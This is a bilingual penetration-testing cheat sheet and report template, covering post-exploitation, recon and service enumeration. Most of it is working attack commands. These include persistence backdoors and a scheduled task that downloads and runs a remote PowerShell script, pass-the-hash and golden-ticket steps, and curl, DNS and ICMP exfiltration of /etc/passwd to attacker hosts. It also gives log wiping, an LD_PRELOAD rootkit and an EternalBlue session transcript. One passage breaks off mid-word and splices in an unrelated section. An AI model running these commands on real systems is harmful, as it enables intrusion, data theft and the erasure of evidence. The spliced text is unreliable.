reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe"
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe"

# Scheduled tasks
schtasks /create /tn "Backdoor" /tr "C:\temp\backdoor.exe" /sc onstart /ru "NT AUTHORITY\SYSTEM"
schtasks /create /tn "Backdoor" /tr "powershell.exe -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1/shell.ps1')\"" /sc minute /mo 5

# Service persistence
sc create backdoor binpath= "C:\temp\backdoor.exe" start= auto
sc start backdoor

# WMI persistence
wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="Backdoor", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0"

# Sticky keys backdoor
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# Golden ticket persistence (if domain admin)
mimikatz.exe
lsadump::dcsync /domain:domain.local /user:krbtgt
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21... /krbtgt:hash /ticket:golden.kirbi /ptt
```

### Lateral Movement

#### 1. Network Discovery
```bash
# Network scanning from compromised host
for i in {1..254}; do ping -c 1 10.10.10.$i | grep "64 bytes" | cut -d" " -f4 | cut -d":" -f1; done

# Port scanning
for port in 21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1433 3306 3389 5432 5985 5986; do
    echo "" | nc -v -w1 10.10.10.1 $port
done

# Service discovery
nmap -sV -T4 10.10.10.0/24
```

#### 2. Credential Reuse
```bash
# SSH with harvested credentials
ssh user@10.10.10.2 -i /tmp/id_rsa

# SMB authentication
smbclient //10.10.10.2/C$ -U 'domain\user%password'
crackmapexec smb 10.10.10.0/24 -u user -p password --shares

# RDP connections
xfreerdp /v:10.10.10.2 /u:administrator /p:password
rdesktop 10.10.10.2 -u administrator -p password

# WinRM
evil-winrm -i 10.10.10.2 -u administrator -p password
```

#### 3. Pass-the-Hash / Pass-the-Ticket
```bash
# Impacket psexec with hash
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:hash administrator@10.10.10.2

# Impacket wmiexec
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:hash administrator@10.10.10.2

# CrackMapExec with hash
crackmapexec smb 10.10.10.0/24 -u administrator -H hash --shares
crackmapexec smb 10.10.10.0/24 -u administrator -H hash -x "whoami"

# Mimikatz pass-the-ticket
mimikatz.exe
kerberos::ptt ticket.kirbi
```

#### 4. Pivoting and Tunneling
```bash
# SSH tunneling
ssh -L 8080:10.10.20.1:80 user@10.10.10.1  # Local port forwarding
ssh -R 4444:127.0.0.1:80 user@10.10.10.1   # Remote port forwarding
ssh -D 9050 user@10.10.10.1                # SOCKS proxy

# Chisel tunneling
# On attacker machine
./chisel server -p 8000 --reverse

# On compromised machine
./chisel client 10.10.14.1:8000 R:socks

# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn 10.10.20.1

# Meterpreter pivoting
meterpreter > run autoroute -s 10.10.20.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 1080
msf6 > run -j
```

### Data Exfiltration

#### 1. File Transfer Methods
```bash
# HTTP download/upload
# Python HTTP server (attacker)
python3 -m http.server 80

# Wget/Curl download (victim)
wget http://10.10.14.1/file.txt
curl http://10.10.14.1/file.txt -o file.txt

# HTTP upload with curl
curl -X POST -F "file=@/etc/passwd" http://10.10.14.1/upload.php

# Base64 exfiltration
cat /etc/passwd | base64 -w 0
# Copy base64 string and decode on attacker machine
echo "base64_string" | base64 -d > passwd.txt

# DNS exfiltration
for line in $(cat /etc/passwd | base64 -w 0 | sed 's/.\{60\}/&\n/g'); do
    nslookup $line.attacker-domain.com
done
```

#### 2. Windows File Transfer
```powershell
# PowerShell download
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/script.ps1')
(New-Object Net.WebClient).DownloadFile('http://10.10.14.1/file.exe', 'C:\temp\file.exe')

# PowerShell upload
$client = New-Object System.Net.WebClient
$client.UploadFile('http://10.10.14.1/upload.php', 'C:\temp\file.txt')

# Certutil download
certutil -urlcache -split -f http://10.10.14.1/file.exe file.exe

# SMB transfer
copy \\10.10.14.1\share\file.exe C:\temp\file.exe
net use \\10.10.14.1\share /user:username password

# FTP transfer
echo open 10.10.14.1 21 > ftp.txt
echo username >> ftp.txt
echo password >> ftp.txt
echo binary >> ftp.txt
echo get file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

#### 3. Steganography and Covert Channels
```bash
# Hide data in images
steghide embed -cf image.jpg -ef secret.txt -sf output.jpg

# ICMP exfiltration
# On attacker machine
tcpdump -i tun0 icmp and icmp[icmptype]=icmp-echo

# On victim machine
cat /etc/passwd | xxd -p | tr -d '\n' | sed 's/.\{16\}/&\n/g' | while read line; do
    ping -c 1 -p $line 10.10.14.1
done
```

### Anti-Forensics and Evasion

#### 1. Log Cleanup
```bash
# Linux log cleanup
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c
unset HISTFILE
export HISTFILESIZE=0
export HISTSIZE=0

# Selective log cleanup
sed -i '/10\.10\.14\.1/d' /var/log/apache2/access.log
grep -v "10.10.14.1" /var/log/auth.log > /tmp/clean_log && mv /tmp/clean_log /var/log/auth.log

# Windows log cleanup
wevtutil cl Application
wevtutil cl System
wevtutil cl Security
wevtutil cl "Windows PowerShell"

# Selective Windows log cleanup
wevtutil qe Security /f:text | findstr /v "10.10.14.1" > cleaned_security.log
```

#### 2. Process Hiding
```bash
# Linux process hiding
# Move to memory-based filesystem
cp /bin/bash /dev/shm/.hidden_shell
/dev/shm/.hidden_shell

# Change process name
exec -a "[kworker/0:1]" /bin/bash

# Windows process hiding
# Process hollowing
.\ProcessHollow.exe C:\Windows\System32\svchost.exe C:\temp\payload.exe

# DLL injection
.\DLLInjector.exe <PID> C:\temp\malicious.dll
```

#### 3. Rootkits and Advanced Persistence
```bash
# Linux rootkit installation
# Diamorphine rootkit (LKM)
git clone https://github.com/m0nad/Diamorphine
cd Diamorphine
make
sudo insmod diamorphine.ko

# Hide process
kill -31 <PID>

# Hide files/directories
touch .hidden_file
chattr +i .hidden_file  # Immutable attribute

# LD_PRELOAD rootkit
cat << 'EOF' > rootkit.c
// Minimal LD_PRELOAD rootkit
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

static int (*real_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent *result = real_readdir(dirp);
    if (result && strstr(result->d_name, "hidden")) {
        return readdir(dirp);
    }
    return result;
}
EOF

gcc -fPIC -shared -o rootkit.so rootkit.c -ldl
export LD_PRELOAD=./rootkit.so
```

### Post-Exploitation Documentation

#### 1. Asset Documentation
```bash
# Create comprehensive asset inventory
cat << 'EOF' > asset_inventory.md
# Compromised Asset Inventory

## Host: 10.10.10.1
- **OS**: Ubuntu 18.04 LTS
- **Kernel**: 4.15.0-72-generic
- **Access Level**: root
- **Method**: SQL injection → LFI → RCE
- **Persistence**: SSH key, cron job
- **Credentials Found**: 
  - mysql: root:password123
  - user: john:qwerty
- **Sensitive Files**: 
  - /etc/shadow (hashes dumped)
  - /home/john/.ssh/id_rsa (private key)
- **Network Position**: DMZ web server
- **Lateral Movement**: Can access 10.10.20.0/24 network

## Recommendations
- Patch SQL injection vulnerability
- Implement input validation
- Remove unnecessary SUID binaries
- Monitor cron job modifications
- Implement network segmentation
EOF
```

#### 2. Timeline Documentation
```bash
# Create attack timeline
cat << 'EOF' > attack_timeline.md
# Attack Timeline

## 2024-01-15
- 09:30 - Initial reconnaissance started
- 10:15 - SQL injection discovered in login.php
- 10:45 - Database enumeration completed
- 11:20 - LFI vulnerability chained with SQL injection
- 11:35 - Initial shell obtained as www-data
- 12:00 - Privilege escalation to root via SUID binary
- 12:30 - Persistence established via SSH key
- 13:00 - Network discovery initiated
- 13:45 - Lateral movement to 10.10.20.5
- 14:30 - Domain credentials harvested
- 15:00 - Post-exploitation documentation completed

## Evidence Files
- initial_scan.xml
- sqli_exploitation.txt  
- privilege_escalation.log
- network_discovery.txt
- credentials_dump.txt
EOF
```

---

## 📋 Documentación y Reportes

### Objetivo
Crear documentación profesional que comunique efectivamente los hallazgos, riesgos e impacto del negocio a diferentes audiencias técnicas y ejecutivas.

### Estructura del Informe Profesional

#### 1. Plantilla de Informe Ejecutivo
```markdown
# INFORME DE PRUEBA DE PENETRACIÓN

**Cliente**: [Nombre del Cliente]
**Alcance**: [Direcciones IP y dominios autorizados]
**Fechas de Prueba**: [DD/MM/YYYY - DD/MM/YYYY]
**Versión del Informe**: 1.0
**Clasificación**: CONFIDENCIAL

---

## RESUMEN EJECUTIVO

### Resumen de Riesgos
- **Crítico**: X vulnerabilidades
- **Alto**: X vulnerabilidades  
- **Medio**: X vulnerabilidades
- **Bajo**: X vulnerabilidades

### Principales Hallazgos
1. **SQL Injection en aplicación web** - Permite acceso completo a la base de datos
2. **Servicio SMB desactualizado** - Vulnerable a EternalBlue (MS17-010)
3. **Credenciales débiles** - Contraseñas por defecto en múltiples servicios

### Impacto en el Negocio
- **Confidencialidad**: ALTO - Acceso a datos sensibles de clientes
- **Integridad**: MEDIO - Posibilidad de modificación de datos
- **Disponibilidad**: BAJO - Posible interrupción de servicios

### Recomendaciones Prioritarias
1. Aplicar parches de seguridad críticos inmediatamente
2. Implementar política de contraseñas robustas
3. Realizar auditoría de configuraciones de seguridad

---

## METODOLOGÍA

La prueba de penetración se realizó siguiendo las mejores prácticas de la industria:

- **OWASP Testing Guide v4.0**
- **NIST SP 800-115**
- **PTES (Penetration Testing Execution Standard)**

### Fases Ejecutadas
1. **Planificación y Reconocimiento**
2. **Enumeración y Mapeo de Servicios** 
3. **Análisis de Vulnerabilidades**
4. **Explotación Controlada**
5. **Post-explotación y Escalada**
6. **Documentación y Reporte**

### Herramientas Utilizadas
- Nmap - Descubrimiento de servicios
- Metasploit Framework - Explotación de vulnerabilidades
- Burp Suite Professional - Análisis de aplicaciones web
- SQLMap - Detección y explotación de SQL injection
- Custom scripts - Automatización de tareas específicas

---

## HALLAZGOS DETALLADOS

### VULN-001: Inyección SQL en Aplicación Web
**Severidad**: CRÍTICA
**CVSS 3.1**: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**CWE**: CWE-89 (SQL Injection)

#### Descripción
La aplicación web presenta una vulnerabilidad de inyección SQL en el parámetro 'username' del formulario de login, permitiendo a un atacante ejecutar consultas SQL arbitrarias.

#### Evidencia Técnica
```http
POST /login.php HTTP/1.1
Host: 10.10.10.1
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1'-- &password=test
```

**Respuesta del servidor**:
```
HTTP/1.1 302 Found
Location: /admin.php
Set-Cookie: PHPSESSID=abc123; path=/
```

#### Impacto
- Bypass completo de autenticación
- Acceso a información sensible de la base de datos
- Posible ejecución de comandos del sistema operativo

#### Reproducción
1. Navegar a http://10.10.10.1/login.php
2. Introducir `admin' OR '1'='1'-- ` en el campo username
3. Introducir cualquier valor en el campo password
4. Hacer clic en "Login"
5. Observar redirección exitosa al panel de administración

#### Recomendaciones
1. **Inmediata**: Implementar consultas parametrizadas (prepared statements)
2. **Corto plazo**: Validación y sanitización de entrada
3. **Largo plazo**: Implementar WAF (Web Application Firewall)

#### Referencias
- OWASP SQL Injection Prevention: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

---

### VULN-002: Servicio SMB Vulnerable (MS17-010)
**Severidad**: CRÍTICA
**CVSS 3.1**: 9.3 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L)
**CVE**: CVE-2017-0144

#### Descripción
El servidor Windows ejecuta una versión vulnerable de SMBv1 susceptible al exploit EternalBlue, permitiendo ejecución remota de código con privilegios SYSTEM.

#### Evidencia Técnica
```bash
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.2

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

#### Explotación
Utilizando Metasploit Framework:
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.2
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.10.14.1:4444
[*] 10.10.10.2:445 - Executing automatic check (disable AutoCheck to override)
[*] 10.10.10.2:445 - The target is vulnerable.
[*] Sending stage (200262 bytes) to 10.10.10.2
[*] Meterpreter session 1 opened (10.10.14.1:4444 -> 10.10.10.2:49158)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### Impacto
- Compromiso completo del sistema
- Acceso con privilegios administrativos máximos
- Posible movimiento lateral en la red

#### Recomendaciones
1. **Inmediata**: Aplicar parche de seguridad MS17-010
2. **Inmediata**: Deshabilitar SMBv1 si no es necesario
3. **Corto plazo**: Implementar segmentación de red
4. **Corto plazo**: Monitoreo de tráfico SMB anómalo

---

## MATRIZ DE RIESGOS

| ID | Vulnerabilidad | Severidad | Probabilidad | Impacto | Riesgo |
|----|----------------|-----------|--------------|---------|---------|
| VULN-001 | SQL Injection Web | Crítica | Alta | Alto | Crítico |
| VULN-002 | SMB MS17-010 | Crítica | Alta | Alto | Crítico |
| VULN-003 | Credenciales Débiles | Alta | Media | Medio | Alto |
| VULN-004 | Versión Apache Obsoleta | Media | Baja | Medio | Medio |

---

## PLAN DE REMEDIACIÓN PRIORIZADO

### Fase 1 - Acciones Inmediatas (0-7 días)
1. **Aplicar parche MS17-010** en servidor Windows
2. **Corregir vulnerabilidad SQL injection** en aplicación web
3. **Cambiar credenciales por defecto** en todos los servicios
4. **Deshabilitar servicios no necesarios**

### Fase 2 - Acciones a Corto Plazo (1-4 semanas)
1. **Actualizar servidor Apache** a versión más reciente
2. **Implementar WAF** para aplicación web
3. **Configurar logging y monitoreo** de seguridad
4. **Realizar auditoría de configuraciones**

### Fase 3 - Acciones a Largo Plazo (1-3 meses)
1. **Implementar programa de gestión de vulnerabilidades**
2. **Establecer políticas de seguridad** formales
3. **Capacitación en seguridad** para desarrolladores
4. **Pruebas de penetración regulares**

---

## ANEXOS

### A. Evidencia Técnica
- Capturas de pantalla de vulnerabilidades
- Logs de comandos ejecutados
- Archivos PCAP de tráfico de red
- Hashes SHA-256 de archivos de evidencia

### B. Comandos de Verificación
```bash
# Verificar parche MS17-010
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
Get-HotFix -Id KB4013429

# Verificar configuración SMB
Get-SmbServerConfiguration | Select EnableSMB1Protocol
```

### C. Referencias Técnicas
- CVE-2017-0144: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
```

#### 2. Templates de Reportes por Audiencia

##### Reporte Técnico Detallado
```markdown
# REPORTE TÉCNICO DE PENTESTING

## INFORMACIÓN DEL ENTORNO
- **Arquitectura de Red**: [Diagrama incluido]
- **Sistemas Operativos**: Windows Server 2016, Ubuntu 18.04
- **Servicios Identificados**: HTTP, HTTPS, SMB, SSH, MySQL
- **Usuarios Identificados**: [Lista de cuentas encontradas]

## METODOLOGÍA TÉCNICA

### Reconocimiento
```bash
# Comandos utilizados
nmap -sS -sV -O -A -T4 10.10.10.0/24
theHarvester -d target.com -b all
amass enum -d target.com
```

### Enumeración
```bash
# SMB Enumeration
enum4linux -a 10.10.10.1
smbmap -H 10.10.10.1
smbclient -L //10.10.10.1 -N

# Web Enumeration  
gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt
nikto -h http://10.10.10.1
```

### Explotación
```bash
# SQL Injection
sqlmap -u "http://10.10.10.1/login.php" --data="username=admin&password=test" --dbs

# EternalBlue Exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.2
exploit
```

## ANÁLISIS FORENSE

### Artefactos Recolectados
- Hashes de contraseñas: `/tmp/hashes.txt` (SHA-256: abc123...)
- Archivos de configuración: `/tmp/config_files.tar.gz`
- Capturas de red: `/tmp/traffic.pcap`
- Screenshots: `/tmp/screenshots/`

### Análisis de Logs
```bash
# Windows Event Logs Analysis
wevtutil qe Security /f:text | findstr "Logon Type 3"

# Linux Auth Logs
grep "Failed password" /var/log/auth.log
grep "Accepted publickey" /var/log/auth.log
```

## DETECCIÓN Y RESPUESTA

### Indicadores de Compromiso (IOCs)
```yaml
network_indicators:
  - ip: 10.10.14.1
    description: "Attacker IP address"
  - domain: malicious-domain.com
    description: "C2 domain"

file_indicators:
  - hash: "5d41402abc4b2a76b9719d911017c592"
    filename: "backdoor.exe"
    path: "C:\\temp\\backdoor.exe"

registry_indicators:
  - key: "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor"
    value: "C:\\temp\\backdoor.exe"
```

### Reglas de Detección
```bash
# Snort Rule
alert tcp any any -> any 4444 (msg:"Potential Reverse Shell"; sid:1000001; rev:1;)

# Sigma Rule
title: Potential SQL Injection Attack
logsource:
    product: apache
detection:
    selection:
        request_uri|contains:
            - "' OR 1=1--"
            - "UNION SELECT"
    condition: selection
```
```

##### Reporte para Management/C-Suite
```markdown
# RESUMEN EJECUTIVO DE SEGURIDAD

## SITUACIÓN ACTUAL
Su organización presenta **vulnerabilidades críticas** que requieren atención inmediata. Durante la auditoría de seguridad se identificaron **2 riesgos críticos** y **3 riesgos altos** que podrían resultar en:

- **Pérdida de datos confidenciales de clientes**
- **Interrupción de operaciones comerc Application Scanning
```bash
# Gobuster - Directory/file brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js

# Dirbuster - GUI directory brute forcer
dirbuster

# FFuF - Fast web fuzzer
ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,204,301,302,307,401,403,500

# WhatWeb - Web technology identifier
whatweb http://target.com

# Nikto - Web server scanner
nikto -h http://target.com -o nikto_results.txt
```

#### Service Enumeration
```bash
# SMB Enumeration
smbmap -H 10.10.10.1
smbclient -L //10.10.10.1 -N
enum4linux -a 10.10.10.1
rpcclient -N 10.10.10.1

# SNMP Enumeration
snmpwalk -c public -v1 10.10.10.1
snmp-check 10.10.10.1

# DNS Enumeration
dnsrecon -d target.com -t std
dnsenum target.com
fierce -dns target.com
```

### Herramientas de Explotación

#### Web Application Exploitation
| Herramienta | Función | Uso |
|-------------|---------|-----|
| **SQLmap** | SQL Injection | `sqlmap -u "http://target.com?id=1" --dbs` |
| **Burp Suite** | Web proxy y scanner | GUI-based |
| **OWASP ZAP** | Web application scanner | GUI-based |
| **XSStrike** | XSS detection | `python3 xsstrike.py -u "http://target.com?q=test"` |
| **NoSQLMap** | NoSQL injection | `python nosqlmap.py -t http://target.com -p param` |

#### Network Exploitation
```bash
# Metasploit Framework
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.1
set LPORT 4444
exploit

# Impacket Suite
psexec.py domain/user:password@10.10.10.1
smbexec.py domain/user:password@10.10.10.1
wmiexec.py domain/user:password@10.10.10.1

# Password Attacks
hydra -l admin -P passwords.txt ssh://10.10.10.1
john --wordlist=rockyou.txt hash.txt
hashcat -m 1000 hash.txt wordlist.txt
```

### Herramientas de Post-Explotación

#### Privilege Escalation
```bash
# Linux Enumeration
linpeas.sh
linenum.sh
unix-privesc-check

# Windows Enumeration
winpeas.exe
powerup.ps1
privesc.exe

# Automated Tools
BeRoot.py (Multi-platform)
```

#### Credential Harvesting
```bash
# Windows
mimikatz
sekurlsa::logonpasswords
lsadump::sam

# Linux
cat /etc/shadow
john --wordlist=rockyou.txt shadow.txt
```

---

## 🔍 Fase 1: Reconocimiento Pasivo (OSINT)

### Objetivo
Recolección de información sin contacto directo con el objetivo. Sin huella digital, actuando como espía antes de cruzar la frontera.

### Información a Recolectar
- Dominios y subdominios
- Direcciones IP y rangos de red
- Correos electrónicos corporativos
- Empleados y estructura organizacional
- Tecnologías utilizadas
- Información filtrada en breaches

### Comandos y Técnicas

#### 1. Información de Dominio
```bash
# WHOIS Lookup - Información del registrador
whois target.com
whois 10.10.10.1

# Información extendida
whois target.com | grep -E "Name Server|Admin|Tech|Registrar"
```

#### 2. Enumeración DNS
```bash
# Registros DNS básicos
dig target.com
dig target.com ANY
dig target.com MX
dig target.com NS
dig target.com TXT

# DNS Zone Transfer (si está mal configurado)
dig axfr target.com @ns1.target.com

# Búsqueda reversa
dig -x 10.10.10.1
```

#### 3. Subdomain Discovery Pasivo
```bash
# TheHarvester - Multiple sources
theharvester -d target.com -l 500 -b google,bing,yahoo,duckduckgo

# Subfinder - Passive enumeration
subfinder -d target.com -silent -o subdomains.txt

# Amass - Comprehensive OSINT
amass intel -d target.com
amass enum -passive -d target.com -o amass_passive.txt
```

#### 4. Certificate Transparency
```bash
# Usando curl y APIs públicas
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Usando certificados SSL
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
```

#### 5. Shodan Intelligence
```bash
# Usando Shodan CLI (requiere API key)
shodan search hostname:"target.com"
shodan search org:"Target Organization"
shodan search net:"10.10.10.0/24"
```

#### 6. Google Dorking
```bash
# Búsquedas especializadas
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intext:"password"
site:target.com intitle:"index of"
site:target.com cache:
```

#### 7. GitHub/GitLab Reconnaissance
```bash
# Usando truffleHog
trufflehog git https://github.com/target/repo

# Usando GitLeaks
gitleaks detect --source /path/to/repo

# Manual searches
site:github.com "target.com" password
site:github.com "target.com" api_key
```

### Documentación de Resultados
```bash
# Crear estructura de directorios
mkdir -p osint/{domains,emails,employees,infrastructure,credentials}

# Documentar hallazgos
echo "target.com" > osint/domains/main_domain.txt
cat subdomains.txt > osint/domains/subdomains.txt
cat emails.txt > osint/emails/corporate_emails.txt
```

---

## 🎯 Fase 2: Reconocimiento Activo

### Objetivo
Interacción directa con el objetivo para descubrir servicios, puertos y tecnologías. Aquí pueden detectarte, así que precisión y sigilo son clave.

### Host Discovery
```bash
# Ping sweep
nmap -sn 10.10.10.0/24
fping -a -g 10.10.10.0/24 2>/dev/null

# ARP Discovery (local network)
arp-scan -l
netdiscover -r 10.10.10.0/24
```

### Port Scanning Strategies

#### 1. Nmap - The Swiss Army Knife

##### Basic Scanning
```bash
# Quick scan - Top 1000 ports
nmap -T4 -F 10.10.10.1

# Full TCP port scan
nmap -p- -T4 10.10.10.1

# UDP scan (slower but important)
nmap -sU --top-ports 1000 10.10.10.1

# Stealth SYN scan
nmap -sS -T2 10.10.10.1
```

##### Advanced Scanning
```bash
# Service version detection
nmap -sV -p 22,80,443,445 10.10.10.1

# OS detection
nmap -O 10.10.10.1

# Script scanning
nmap -sC -p 22,80,443,445 10.10.10.1

# Aggressive scan (combines -O -sV -sC --traceroute)
nmap -A 10.10.10.1

# Custom script categories
nmap --script vuln,exploit,brute 10.10.10.1
```

##### Nmap Scripts (NSE)
```bash
# Update script database
nmap --script-updatedb

# List available scripts
nmap --script-help all | grep -E "^[a-z-]+" | sort

# Vulnerability detection
nmap --script vuln 10.10.10.1

# Brute force attacks
nmap --script brute 10.10.10.1

# Discovery scripts
nmap --script discovery 10.10.10.1
```

#### 2. Masscan - High-Speed Scanner
```bash
# Fast port scan
masscan -p1-65535 10.10.10.0/24 --rate=1000 -oG masscan_results.txt

# Specific ports across range
masscan -p80,443,22,21,25,53,110,143,993,995 10.10.10.0/24 --rate=10000

# Banner grabbing
masscan -p80,443 10.10.10.0/24 --banners --rate=1000
```

#### 3. RustScan - Modern Alternative
```bash
# Basic scan with nmap integration
rustscan -a 10.10.10.1 -- -sC -sV

# Custom port range
rustscan -a 10.10.10.1 -r 1-1000

# Multiple targets
rustscan -a 10.10.10.1,10.10.10.2,10.10.10.3
```

### Evasion Techniques
```bash
# Timing delays
nmap -T1 10.10.10.1  # Paranoid (very slow)
nmap -T2 10.10.10.1  # Sneaky
nmap -T3 10.10.10.1  # Normal (default)

# Fragmented packets
nmap -f 10.10.10.1

# Decoy scanning
nmap -D RND:10 10.10.10.1

# Source port spoofing
nmap --source-port 53 10.10.10.1

# Randomize targets
nmap --randomize-hosts 10.10.10.0/24
```

### Documentation
```bash
# Save all formats
nmap -A -oA full_scan 10.10.10.1

# XML output for further processing
nmap -oX scan_results.xml 10.10.10.0/24

# Parse XML results
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('scan_results.xml')
for host in tree.findall('.//host'):
    addr = host.find('address').get('addr')
    ports = [p.get('portid') for p in host.findall('.//port[@protocol=\"tcp\"]/state[@state=\"open\"]/../..')]
    if ports:
        print(f'{addr}: {ports}')
"
```

---

## 🔧 Fase 3: Enumeración y Mapeo de Servicios

### Objetivo
Análisis profundo de servicios identificados para comprender configuraciones, versiones y posibles vectores de ataque.

### HTTP/HTTPS Enumeration (Puertos 80/443)

#### 1. Information Gathering
```bash
# Basic HTTP headers
curl -I http://10.10.10.1
curl -I https://10.10.10.1

# Technology identification
whatweb http://10.10.10.1 -v
whatweb https://10.10.10.1 --color=never --no-errors -a 3

# Certificate analysis
sslscan 10.10.10.1:443
sslyze 10.10.10.1:443
testssl.sh https://10.10.10.1
```

#### 2. Directory and File Discovery
```bash
# Gobuster - Fast directory brute forcer
gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js,asp,aspx -o gobuster_results.txt

# Advanced gobuster with multiple extensions
gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,asp,aspx,jsp,xml,json,bak,old,~,log

# FFuF - Fast web fuzzer
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.1/FUZZ -mc 200,204,301,302,307,401,403

# Recursive directory scanning
gobuster dir -u http://10.10.10.1 -w wordlist.txt -r -l -x php,html -o recursive_scan.txt
```

#### 3. Parameter Discovery
```bash
# Parameter fuzzing with FFuF
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.10.10.1/index.php?FUZZ=test -mc 200

# Arjun - HTTP parameter discovery
arjun -u http://10.10.10.1/login.php

# ParamSpider - Parameter mining from web archives
python3 paramspider.py -d target.com
```

#### 4. Content Management System Detection
```bash
# WordPress
wpscan --url http://10.10.10.1 --enumerate ap,at,u,dbe

# Joomla
joomscan -u http://10.10.10.1

# Drupal
droopescan scan drupal -u http://10.10.10.1

# Generic CMS detection
cmseek -u http://10.10.10.1
```

#### 5. Robots.txt and Sitemap Analysis
```bash
# Check robots.txt
curl -s http://10.10.10.1/robots.txt

# Check sitemap
curl -s http://10.10.10.1/sitemap.xml

# Security.txt (RFC 9116)
curl -s http://10.10.10.1/.well-known/security.txt
```

### SMB/NetBIOS Enumeration (Puertos 139/445)

#### 1. Service Detection
```bash
# Nmap SMB scripts
nmap --script smb-os-discovery,smb-security-mode,smb-enum-sessions,smb-enum-shares,smb-enum-users -p 139,445 10.10.10.1

# SMB version detection
smbver.sh 10.10.10.1

# NetBIOS information
nbtscan 10.10.10.1
nmblookup -A 10.10.10.1
```

#### 2. Comprehensive Enumeration
```bash
# enum4linux - Complete SMB enumeration
enum4linux -a 10.10.10.1
enum4linux -u "" -p "" -a 10.10.10.1  # Null session
enum4linux -u "guest" -p "" -a 10.10.10.1  # Guest session

# SMBMap - Share enumeration
smbmap -H 10.10.10.1
smbmap -H 10.10.10.1 -u anonymous
smbmap -H 10.10.10.1 -u guest -p ""

# SMBClient - Share access
smbclient -L //10.10.10.1 -N  # List shares
smbclient //10.10.10.1/share -N  # Connect to share
```

#### 3. Advanced SMB Techniques
```bash
# CrackMapExec - Multi-purpose SMB tool
crackmapexec smb 10.10.10.0/24
crackmapexec smb 10.10.10.1 --shares
crackmapexec smb 10.10.10.1 --users
crackmapexec smb 10.10.10.1 --rid-brute

# Impacket tools
python3 /usr/share/doc/python3-impacket/examples/rpcdump.py 10.10.10.1
python3 /usr/share/doc/python3-impacket/examples/samrdump.py 10.10.10.1
python3 /usr/share/doc/python3-impacket/examples/services.py 10.10.10.1
```

### SSH Enumeration (Puerto 22)

#### 1. Banner Grabbing
```bash
# Basic banner
nc 10.10.10.1 22
telnet 10.10.10.1 22

# SSH version and algorithms
ssh-keyscan 10.10.10.1
ssh -o BatchMode=yes -o ConnectTimeout=5 10.10.10.1

# Nmap SSH scripts
nmap --script ssh-hostkey,ssh-auth-methods 10.10.10.1 -p 22
```

#### 2. User Enumeration
```bash
# SSH user enumeration (CVE-2016-6210)
python3 ssh_user_enum.py --port 22 --userList users.txt 10.10.10.1

# Manual timing attack
ssh invaliduser@10.10.10.1  # Note response time
ssh root@10.10.10.1         # Compare response time
```

### FTP Enumeration (Puerto 21)

#### 1. Basic Enumeration
```bash
# Banner grabbing
nc 10.10.10.1 21
telnet 10.10.10.1 21

# Anonymous login test
ftp 10.10.10.1
